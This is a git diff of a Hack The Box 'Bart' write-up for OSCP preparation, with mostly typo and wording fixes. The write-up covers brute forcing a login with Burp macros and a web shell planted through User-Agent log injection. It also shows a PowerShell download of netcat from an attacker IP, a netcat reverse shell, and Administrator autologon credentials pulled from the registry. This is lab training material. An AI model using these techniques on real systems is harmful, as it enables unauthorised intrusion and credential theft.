@@ -7,13 +7,13 @@ tags: ["Hack The Box","OSCP"]
 {% assign imgDir="HTB-Bart-Writeup" %}
 
 # Introduction
-The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of wordlist generation, source code analysis, log injection vulnerabilties and extraction of autologon credentials. In addition, it requires knowledge concerning how to dynamically set parameter values in brute force attacks, which is something that can be performed using Burp Suite macros.
+The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of wordlist generation, source code analysis, log injection vulnerabilities and extraction of autologon credentials. In addition, it requires knowledge concerning how to dynamically set parameter values in brute force attacks, which is something that can be performed using Burp Suite macros.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
 By enumerating the target, it is possible to discover a web application at [http://forum.bart.htb](http://forum.bart.htb) and a login prompt at [http://bart.htb/monitor/](http://bart.htb/monitor/). The former can be used to identify potential usernames and generate a list of potential passwords. These potential usernames and passwords can then be used in a brute force attack against the login prompt to gain access to a server monitoring software. This software then reveals an internal chat application which is behind another login prompt. The chat application is open source and it is possible to find the source code for the account registration functionality. 
 
-A source code analysis reveals that anyone can register an account. As such, a registration request can be reconstructed and used to bypass the second login prompt. Once authenticated, it can be discovered that the application is logging the `User-Agent` field of certain requests, in a dangerous way. This logging funcationlity can be abused by sending a request with a PHP web shell in the `User-Agent` header and ensuring that it is uploaded to a file with a `.php` extension. Using the web shell, an interactive shell can then be obtained as the `nt authority\iusr` account. Thereafter, it can be discovered that the target has autologon credentials for the `Administrator` user. The password of this user can be obtained from the Windows registry and then be used to compromise the account!
+A source code analysis reveals that anyone can register an account. As such, a registration request can be reconstructed and used to bypass the second login prompt. Once authenticated, it can be discovered that the application is logging the `User-Agent` header of certain requests. This logging functionality can be abused by sending a request with a PHP web shell in the `User-Agent` header and ensuring that it is uploaded to a file with a `.php` extension. An interactive shell can be obtained as the `nt authority\iusr` account, using the web shell. Thereafter, it can be discovered that the target has autologon credentials for the `Administrator` user. The password of this user can be obtained from the Windows registry and then be used to compromise the account!
 
 # Exploitation
 We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.81`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that there is a web server on port 80.
@@ -55,18 +55,18 @@ We can add the domain name `forum.bart.htb` to our `/etc/hosts` file to ensure t
 └─$
 {% endhighlight %}
 
-If we attempt to re-visit the web page, we can see that it now loads properly. 
+If we attempt to revisit the web page, we can see that it now loads properly. 
 
 ![forum.bart.htb2](/assets/{{ imgDir }}/forum.bart.htb2.png)
 
-Scrolling down, we find the names of four employees.
+If we scroll down, we find the names of four employees.
 
 ![team](/assets/{{ imgDir }}/team.png)
 
 ![team2](/assets/{{ imgDir }}/team2.png)
 
 ![team3](/assets/{{ imgDir }}/team3.png)
-We can also find an additional employee by inspecting the source code. This employee was excluded from the presentation of team members due to design limitations. In total, we have discovered five employees. These are `Samantha Brown`, `Daniel Simmons`, `Robert Hilton`, `Harvey Potter` and `Jane Doe`. Next, we can try to guess directories and file names with [ffuf](https://github.com/ffuf/ffuf) for the domains `bart.htb` and `forum.bart.htb`. We use the `-u` flag to specify the target URL and the `-w` to specify a wordlist we want to use. We also include the `-ic` to include any comments in the wordlist.
+We can also find an additional employee by inspecting the source code. This employee was excluded from the presentation of team members due to design limitations. In total, we have discovered five employees. These are `Samantha Brown`, `Daniel Simmons`, `Robert Hilton`, `Harvey Potter` and `Jane Doe`. Next, we can try to guess directories and file names with [ffuf](https://github.com/ffuf/ffuf) for the domains `bart.htb` and `forum.bart.htb`. We use the `-u` flag to specify the target URL and the `-w` flag to specify a wordlist we want to use. We also include the `-ic` flag to ignore any comments in the wordlist.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -147,11 +147,12 @@ ________________________________________________
 :: Progress: [81630/81630] :: Job [1/1] :: 29 req/sec :: Duration: [1:07:37] :: Errors: 148 ::
 {% endhighlight %}
 
-The results of the directory bruteforce suggests that there are two directories. The first is `/forum` which redirects to `/forum/` which is identical to `forum.bart.htb`. The second one is `/monitor` which redirects us `/monitor/` which prompts us for credentials, as shown below. Fuzzing the `forum.bart.htb` domain with the same wordlist did not result in anything except for the `/` page.
+The results of the directory bruteforce suggests that there are two directories. The first is `/forum` which redirects to `/forum/`. Visiting the `/forum/` page in a browser reveals that this web page is identical to `forum.bart.htb`. The second one is `/monitor` which redirects us to `/monitor/`. Visiting the `/monitor/` page reveals a login prompt, as shown below. Fuzzing the `forum.bart.htb` domain with the same wordlist did not result in anything except for the `/` page.
 
 ![monitor](/assets/{{ imgDir }}/monitor.png)
 
-We could try to guess correct credentials through a brute force attack. We can use the names of five employeese to manually create a list of potential usernames, as shown below.
+To bypass the login prompt, we could try to guess a correct set of credentials through a brute force attack. This would require a list of potential usernames and passwords. We can use the names of the five employees we discovered earlier, to manually create a list of potential usernames, as shown below.
+
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@cat users@@                                   
@@ -175,7 +176,7 @@ jane.doe
 └─$
 {% endhighlight %}
 
-Next, we can generate a wordlist of potential passwords using [cewl](https://github.com/digininja/CeWL) which is a tool for generating wordlists based on websites. We use the `-w` flag to specify an output file and the `--lowercase` flag to instruct `cewl` that we want a lowercase wordlist.  This results in a wordlist containing 231 potential lowercase password. We can execute `cat wordlist | sed 's/.*/\u&/' | tee -a wordlist` to double the number of passwords by creating a copy of each potential password where the first character has been swapped to the corresponding uppercase character. For example, the password `secret` would become `Secret`. At this point, we have 462 potential passwords. We could try to perform a brute force attack using Burp suite's `Intruder` tool with the list of potential usernames and passwords.
+We can generate a wordlist of potential passwords using [CeWL](https://github.com/digininja/CeWL) which is a tool for generating wordlists based on web pages. We use the `-w` flag to specify an output file and the `--lowercase` flag to instruct `CeWL` that we want a lowercase wordlist. This results in a wordlist containing 231 potential lowercase password. We can execute `cat wordlist | sed 's/.*/\u&/' | tee -a wordlist` to double the number of passwords by creating a copy of each potential password where the first character has been swapped to the corresponding uppercase character. For example, the password `secret` would become `Secret`. At this point, we have 462 potential passwords. We could try to perform a brute force attack using Burp suite's `Intruder` tool with the list of potential usernames and passwords. However, first, we need to know what a login request looks like.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -199,17 +200,17 @@ CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 
 ![loginx](/assets/{{ imgDir }}/loginx.png)
 
-To see how a login request looks like, we can attempt to login with a random username and password using the built-in Burp Suite browser. The request, shown below, is a POST request which contains the parameters `csrf`, `user_name`, `user_password` and `action`. The first parameter is a CSRF token which is a string containing random characters. CSRF tokens are normally submitted together with forms to ensure that cross-domain requests require read-access to the domain they are targetting. This prevents one domain's JavaScript from doing things on another domain without user consent.
+To find out how a login request looks like, we can attempt to login with a random username and password using the built-in Burp Suite browser. The request, shown below, is a `POST` request which contains the parameters `csrf`, `user_name`, `user_password` and `action`. The first parameter is a CSRF token which is a string containing random characters. CSRF tokens are normally submitted together with forms to ensure that cross-domain requests require read-access to the domain they are targetting. This prevents one domain's JavaScript from doing things on another domain without user consent.
 
 ![loginx2](/assets/{{ imgDir }}/loginx2.png)
 
 ![loginForm](/assets/{{ imgDir }}/loginForm.png)
 
-If we inspect the source code of the login page, we can see that the CSRF token is included in the login form. This token changes every time the login form is loaded and should thus be different with every log in attempt. This means that the login form should be loaded before each authentication attempt in a brute force attack, since the login form contains a valid value for the CSRF token. Fortunately, Burp Suite supports macros which makes it possible to dynamically set the value of the `CSRF` variable. We can find the macro configurations by clicking the `Project options` tab and pressing the `Sessions` subtab.
+If we inspect the source code of the login page, we can see that the CSRF token is included in the login form. This token changes every time the login form is loaded and should thus be different in every log in attempt. This means that the login form should be loaded before each authentication attempt in a brute force attack, since the login form contains a valid value for the `csrf` parameter. Fortunately, Burp Suite supports macros which makes it possible to dynamically set the value of the `csrf` parameter. We can find the macro configurations by clicking the `Project options` tab and pressing the `Sessions` subtab.
 
 ![macro](/assets/{{ imgDir }}/macro.png)
 
-We press the `Add` button to add a macro. This opens the window below, where we can select a request. We select the GET request which was sent earlier to load the login form. Then, we press the `OK` button twice to register this macro as a macro named "Macro 1".
+We press the `Add` button to add a macro. This opens the window below, where we can select a request. We select the `GET` request which was sent earlier to load the login form. Then, we press the `OK` button twice to register this macro as a macro named "Macro 1".
 
 ![recordMacro](/assets/{{ imgDir }}/recordMacro.png)
 
@@ -217,12 +218,12 @@ We press the `Add` button to add a macro. This opens the window below, where we 
 
 ![shr](/assets/{{ imgDir }}/shr.png)
 
-At the top of the `Sessions` tab in Burp Suite, we find configurations for session handling rules. Here, we press the `Add` button to open the `Session handling rule editor` window.
+We can use session handling rules to instruct Burp to run the macro, extract the CSRF token and use its value in login requests. The session handling rules configurations can be found at the top of the `Sessions` subtab. Here, we press the `Add` button to open the `Session handling rule editor` window.
 
 ![shr2](/assets/{{ imgDir }}/shr2.png)
 
 ![shr3](/assets/{{ imgDir }}/shr3.png)
-In this window, we press the `Add` button and select `Run a macro` in the dropdown. Then, we select our macro. We check the `Update only the following parameters` checkbox and enter "csrf" since this is the name of the parameter which we want to set dynamically. Then, we press `OK` and press the `Scope` tab.
+In this window, we press the `Add` button and select `Run a macro` in the dropdown menu. Then, we select our macro. We check the `Update only the following parameters` checkbox and enter "csrf" since this is the name of the parameter which we want to set dynamically. Then, we press `OK` and press the `Scope` tab.
 
 ![shr4](/assets/{{ imgDir }}/shr4.png)
 
@@ -230,15 +231,15 @@ In the `Scope` tab, we click `Use custom scope` and enter `http://bart.htb/` as 
 
 ![shr5](/assets/{{ imgDir }}/shr5.png)
 
-Next, we will use the intruder to perform our brute force attack. We start by right-clicking the login request and pressing `Send to Intruder` in the dropdown.
+Next, we will use the `Intruder` tool to perform our brute force attack. We start by right-clicking the login request and pressing `Send to Intruder` in the dropdown.
 
 ![intruder](/assets/{{ imgDir }}/intruder.png)
 
-Then, we set the `user_name` and `user_password` fields as payload positions. We also select the attack type `cluster bomb` since this attack type will ensure that all permutations of users and passwords will be attempted. 
+Then, we mark the `user_name` and `user_password` fields as payload positions. We also select the attack type `Cluster bomb` since this attack type will ensure that all permutations of users and passwords will be attempted. 
 
 ![intruder2](/assets/{{ imgDir }}/intruder2.png)
 
-Next, we press the `payloads` tab to configure what to inject into the payload positions. For payload set 1, we press the `Load...` button and select the `users` file we created earlier. Similarly, for payload set 2, we press the `Load...` button and select the `wordlist` file we created earlier.
+Next, we press the `payloads` tab to configure what to inject into the payload positions. For payload set 1, we press the `Load...` button and select the `users` file we created earlier. For payload set 2, we press the `Load...` button and select the `wordlist` file we created earlier.
 
 ![intruderUsername](/assets/{{ imgDir }}/intruderUsername.png)
 
@@ -248,7 +249,7 @@ At this point, we have configured everything we need and we can start the brute 
 
 ![bfOK](/assets/{{ imgDir }}/bfOK.png)
 
-After a couple of minutes, we see a requests which results in a `302 Found` rather than a `200 OK`, indicating that we authenticated successfully! This authentication was performed with the username `harvey` and password `potter`. 
+After a couple of minutes, we see a request which results in a `302 Found` rather than a `200 OK`, indicating that we authenticated successfully! This authentication was performed with the username `harvey` and password `potter`. 
 
 ![loginResponse](/assets/{{ imgDir }}/loginResponse.png)
 
@@ -300,7 +301,7 @@ If we search for "simple_chat" on google, we find a github repository [https://g
 
 ![github](/assets/{{ imgDir }}/github.png)
 
-By studying repostiory more closely, it is possible to find a file name "register.php" which let's anyone create an account. Relevant parts of this file are displayed below. At line x to x, an if clause checks if a username was provided in a parameter named "uname". If the parameter was provided, its value is validated using the function `validate_username`. Similarly, at line x to x, an if clause checks if a password is provided in a parameter named "passwd" and validates this password. If no errors occur, the code between line x and x is executed. This code attempts to register a new account on line x and then redirects the user to the login form at line x, if the registration is successful.  
+By studying the repository more closely, it is possible to find a file named "register.php" which lets anyone create an account. The relevant parts of this file are displayed below. At line 5 to 12, an if clause checks if a username was provided in a parameter named "uname". If the parameter was provided, its value is validated using the function `validate_username`. Similarly, at line 15 to 23, an if clause checks if a password is provided in a parameter named "passwd" and validates this password. If no errors occur, the code between line 29 and 48 is executed. This code attempts to register a new account on line 30 and then redirects the user to the login form or `../`, if the registration is successful.  
 
 {% highlight php linenos %}
 [...]
@@ -375,13 +376,13 @@ If we try to log in with the username `test` and password `Testing123!`, we are 
 
 ![internalChat](/assets/{{ imgDir }}/internalChat.png)
 
-There are two buttons labeled "refresh" and "log" in the top right corner of this chat. Pressing the `refresh` button simply refreshes the chat. The `log` button, however, resutls in a request to `/log/log.php`. 
+There are two buttons labeled "Refresh" and "Log" in the top right corner of this chat. Pressing the `Refresh` button simply refreshes the chat. The `Log` button, however, results in a request to `/log/log.php`. 
 
 ![logRaw](/assets/{{ imgDir }}/logRaw.png)
 
 ![logRawResp](/assets/{{ imgDir }}/logRawResp.png)
 
-This request results in the response shown above which only contains the number `1`. The request included a `filename` parameter with the value `log.txt`. Requesting this file with a GET request indicates that the `log.php` script is logging the username provided in the username parameter together with user agent from the `User-Agent` header. 
+This request results in the response shown above which only contains the number `1`. The request included a `filename` parameter with the value `log.txt`. Requesting this file with a `GET` request indicates that the `log.php` script is logging the username provided in the `username` parameter together with user agent from the `User-Agent` header. 
 
 ![logtxt](/assets/{{ imgDir }}/logtxt.png)
 
@@ -399,7 +400,7 @@ If we try to execute the command `whoami`, using the webshell, we can see that o
 
 ![whoamiResp](/assets/{{ imgDir }}/whoamiResp.png)
 
-we can execute the command `powershell "[Environment]::Is64BitOperatingSystem"` to check if we are dealing with a 32-bit or 64-bit operating system. Upon doing this, we get the output `True`, meaning that the target operating system is 64-bit. As such, we will use the 64-bit version of netcat to ensure that our reverse shell process is a 64-bit process.
+We can execute the command `powershell "[Environment]::Is64BitOperatingSystem"` to check if we are dealing with a 32-bit or 64-bit operating system. Upon doing this, we get the output `True`, meaning that the target operating system is 64-bit. As such, we will create our reverse shell payload using the 64-bit version of netcat to ensure that our reverse shell process is a 64-bit process.
 
 ![64bit](/assets/{{ imgDir }}/64bit.png)
 
@@ -443,7 +444,7 @@ Archive:  netcat-win32-1.11.zip
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 {% endhighlight %}
 
-Next, we execute the command `powershell "wget http://10.10.16.2/netcat-1.11/nc64.exe -OutFile nc64.exe"` to download the netcat binary to the target host. This can be performed by requesting [http://internal-01.bart.htb/log/ws.php?c=powershell+"wget+http%3a//10.10.16.2/nc64.exe+-OutFile+nc64.exe"](http://internal-01.bart.htb/log/ws.php?c=powershell+"wget+http%3a//10.10.16.2/nc64.exe+-OutFile+nc64.exe").
+Next, we execute the command `powershell "wget http://10.10.16.2/nc64.exe -OutFile nc64.exe"` to download the netcat binary to the target host. This can be performed by requesting [http://internal-01.bart.htb/log/ws.php?c=powershell+"wget+http%3a//10.10.16.2/nc64.exe+-OutFile+nc64.exe"](http://internal-01.bart.htb/log/ws.php?c=powershell+"wget+http%3a//10.10.16.2/nc64.exe+-OutFile+nc64.exe").
 
 ![revShell](/assets/{{ imgDir }}/revShell.png)
 
@@ -451,7 +452,7 @@ Thereafter, we execute `nc -lvp 443` to start a netcat listener on port 443. The
 
 
 # Privilege Escalation
-The Windows Registry can be used to configure Windows for a cascade of use cases. One of these is to [configure automatic logons](https://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon). This feature allows anyone to log in automatically with a preconfigured account. Credentails for this preconfigured account are usually stored under the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon`. If we query the registry for this key, we discover that autologons are configured for the `Administrator` account!
+The [Windows registry](https://en.wikipedia.org/wiki/Windows_Registry) can be used to configure Windows for a cascade of use cases. One of these is to [configure automatic logons](https://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon). This feature allows anyone to log in automatically with a preconfigured account. Credentials for this preconfigured account are usually stored under the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon`. If we query the registry for this key, we discover that autologons are configured for the `Administrator` account!
 
 {% highlight none linenos %}
 PS C:\inetpub\wwwroot\internal-01\log> @@Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'@@
@@ -528,4 +529,4 @@ Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc64.exe -e pow
 
 ![rootShell](/assets/{{ imgDir }}/rootShell.png)
 
-Once we execute the `Invoke-Command` command, our original shell freezes and we obtain a new shell as the `Administrator` user!
+Once we execute the `Invoke-Command` command, the shell freezes and we obtain a new shell as the `Administrator` user!
